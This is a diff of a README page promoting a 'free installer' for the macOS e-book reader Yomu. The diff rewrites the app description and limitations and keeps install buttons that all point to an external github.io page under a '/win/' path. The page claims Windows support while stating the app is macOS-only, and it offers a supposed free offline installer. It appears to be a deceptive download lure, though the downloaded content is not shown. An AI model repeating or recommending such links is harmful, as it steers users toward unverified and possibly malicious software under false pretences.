@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Ebook+Reader-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-E--Book+Reader-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Yomu EBook Reader Free Installer** — Yomu is a free macOS ebook reader app supporting EPUB, PDF, and CBR/CBZ comic formats. Works without internet access, no account required. Full offline installation.
+**💻 Yomu EBook Reader Free Installer** — Yomu is a clean, minimalist e-book reader for macOS that supports EPUB and PDF formats. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Yomu EBook Reader](https://img.shields.io/badge/⬇_Install_Yomu%20EBook%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Yomu EBook Reader](https://img.shields.io/badge/⬇_Install_Yomu+EBook+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Yomu EBook Reader
 
-Yomu is a free macOS ebook reader app supporting EPUB, PDF, and CBR/CBZ comic formats. It features a beautiful reading interface, iCloud sync, night mode, adjustable typography, and notes and highlights with iCloud backup.
+Yomu is a clean, minimalist e-book reader for macOS that supports EPUB and PDF formats. It features a beautiful reading interface with customizable fonts, themes, and typography settings. Yomu integrates with iCloud for seamless library syncing across Apple devices, making it ideal for readers who want a distraction-free reading experience on their Mac.
 
 ---
 
 ## ❌ Problem: Yomu EBook Reader is hard to access
 
-- **macOS Only** — No Windows or Linux version; iOS app is separate
-- **Format Limitations** — Does not support Kindle MOBI/AZW format without conversion
-- **Development Pace** — Updates arrive infrequently from the single developer
-- **Library Management** — Limited collection organization compared to Calibre or similar tools
+- **macOS Only** — No Windows or cross-platform version available
+- **Limited Format Support** — Primarily EPUB and PDF, no MOBI or AZW3
+- **No DRM Support** — Cannot open DRM-protected books from major retailers
+- **iCloud Dependency** — Sync features require iCloud account
 
 ---
 
@@ -81,7 +81,7 @@ Yomu is a free macOS ebook reader app supporting EPUB, PDF, and CBR/CBZ comic fo
 
 <div align="center">
 
-[![⬇ Install Yomu EBook Reader](https://img.shields.io/badge/⬇_Install_Yomu%20EBook%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Yomu EBook Reader](https://img.shields.io/badge/⬇_Install_Yomu+EBook+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Yomu is a free macOS ebook reader app supporting EPUB, PDF, and CBR/CBZ comic fo
 
 ---
 
-**Yomu EBook Reader Free Installer** — Yomu is a free macOS ebook reader app supporting EPUB, PDF, and CBR/CBZ comic formats. Install without internet connection today!
+**Yomu EBook Reader Free Installer** — Yomu is a clean, minimalist e-book reader for macOS that supports EPUB and PDF formats. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Yomu EBook Reader](https://img.shields.io/badge/⬇_Install_Yomu%20EBook%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Yomu EBook Reader](https://img.shields.io/badge/⬇_Install_Yomu+EBook+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
